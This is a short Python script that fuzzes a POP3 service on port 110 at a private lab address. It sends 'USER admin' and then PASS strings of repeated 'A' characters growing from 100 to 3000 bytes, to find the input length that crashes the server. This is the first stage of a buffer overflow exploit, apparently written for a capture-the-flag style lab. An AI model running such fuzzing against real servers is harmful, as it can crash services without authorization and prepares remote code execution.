import socket, sys

ip = "10.10.191.38"
port = 110

test = []
counter = 100

while len(test) < 30:
    test.append("A" * counter)
    counter += 100

for string in test:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
    
        s.recv(1024)
        print(len(string))
        s.send("USER admin" + "\r\n")
        s.recv(1024)

        s.send("PASS " + string + "\r\n")
    except:
        print("connection error")
        sys.exit(0)




